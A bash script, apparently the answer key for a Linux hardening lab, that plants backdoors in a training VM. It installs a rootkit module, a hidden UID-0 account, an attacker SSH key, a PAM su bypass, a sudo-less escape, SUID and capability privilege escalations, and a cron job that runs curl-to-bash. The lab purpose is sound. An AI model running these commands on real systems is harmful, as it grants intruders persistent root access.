#!/usr/bin/env bash
# install.sh — plant the "inherited compromise" into the lab VM at provision
# time. This is the ANSWER KEY for harden/01-recon: everything it creates is
# something the host sweep is meant to find and remove. Run once by cloud-init
# as root. Plants are deliberately unsafe, make no external callbacks, and belong only in the VM.
set -euo pipefail
[[ $EUID == 0 ]] || { echo "root required" >&2; exit 1; }
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"


echo "[badseed] diamorphine"
mkdir -p /diamorphine
install -m0644 "$HERE/Diamorphine/diamorphine.ko" /diamorphine/diamorphine.ko

echo "[badseed] accounts"
# A second UID-0 account hiding behind a service-y name (classic persistence).
if ! id svc-deploy >/dev/null 2>&1; then
  useradd -o -u 0 -g 0 -M -s /bin/bash svc-deploy
fi
# An unprivileged human who was quietly given root-equivalent group power.
id webops >/dev/null 2>&1 || useradd -m -s /bin/bash webops
usermod -aG sudo,docker webops
echo 'webops:webops' | chpasswd
# Stash an "attacker" key in root's authorized_keys alongside the legit one.
install -d -m700 /root/.ssh
grep -q 'ATTACKER-DROPPED-KEY' /root/.ssh/authorized_keys 2>/dev/null || \
  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILabBADBADBADBADBADBADBADBADBADBADBADBADBADBADbad attacker@evil  # ATTACKER-DROPPED-KEY' \
  >> /root/.ssh/authorized_keys

echo "[badseed] su PAM authentication bypass for the root target"
# PAM_USER is the target account, not the caller. Some releases use an independent su-l stack.
# Ordinary users can become root without a password; other targets use normal auth.
for policy in /etc/pam.d/su /etc/pam.d/su-l; do
  [[ -f $policy ]] || continue
  if ! grep -q 'MSHP-SU-PAM-BYPASS' "$policy"; then
    sed -i '1i auth sufficient pam_succeed_if.so user = root # MSHP-SU-PAM-BYPASS' "$policy"
  fi
done

echo "[badseed] sudo backdoor"
# A subtle GTFOBins trap: webops was "just" given passwordless 'less' (for log
# viewing, supposedly). less can spawn a shell and read any file as root.
printf 'webops ALL=(ALL) NOPASSWD: /usr/bin/less\n' > /etc/sudoers.d/90-webops
chmod 0440 /etc/sudoers.d/90-webops

echo "[badseed] SUID-root shell"
cc -O2 -o /usr/local/bin/notes "$HERE/notes.c"
chown root:root /usr/local/bin/notes
chmod 4755 /usr/local/bin/notes

echo "[badseed] file-capability backdoor on python"
# cap_setuid on the real python ELF: any user can then setuid(0).
PYBIN="$(readlink -f /usr/bin/python3)"
setcap cap_setuid+ep "$PYBIN" || true

echo "[badseed] polkit/pkexec backdoor"
install -d -m755 /etc/polkit-1/rules.d
install -m0644 "$HERE/49-trusted.rules" /etc/polkit-1/rules.d/49-trusted.rules

echo "[badseed] persistence: rogue cron"
# Inert beacon (egress is dropped anyway); TEST-NET-2 address, never routes.
printf '*/5 * * * * root curl -fsS http://198.51.100.13/b.sh | bash  # backup\n' \
  > /etc/cron.d/backup
chmod 0644 /etc/cron.d/backup

echo "[badseed] backdoors in the application-data startup hook"
install -d -m0755 /opt/app-data
install -m0755 "$HERE/start.sh" /opt/app-data/start.sh
install -m0644 "$HERE/app-data-start.service" /etc/systemd/system/app-data-start.service

echo "[badseed] weak permissions"
install -d -m0777 /opt/app-data/uploads            # world-writable dir
printf 'db_password: s3cr3t-in-the-clear\n' > /opt/app-data/config.yml
chmod 0644 /opt/app-data/config.yml                # world-readable secret

echo "[badseed] done — box is now 'inherited-dirty'."
